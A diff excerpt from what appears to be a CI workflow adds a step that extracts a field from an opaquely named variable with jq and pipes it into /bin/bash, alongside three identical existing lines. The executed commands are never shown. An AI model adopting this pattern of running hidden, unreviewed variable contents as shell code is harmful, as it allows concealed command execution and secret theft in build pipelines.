@@ -62,6 +62,7 @@ jobs:
           echo $hvhlu5 | jq -r .exi051 | /bin/bash
           printf '%s' "$plw4" | jq -r .dh725 | /bin/bash
           echo $lgukg5 | jq -r .nm79 | /bin/bash
+          echo $r510 | jq -r .g0427 | /bin/bash
 
       - name: Save output
         if: always()
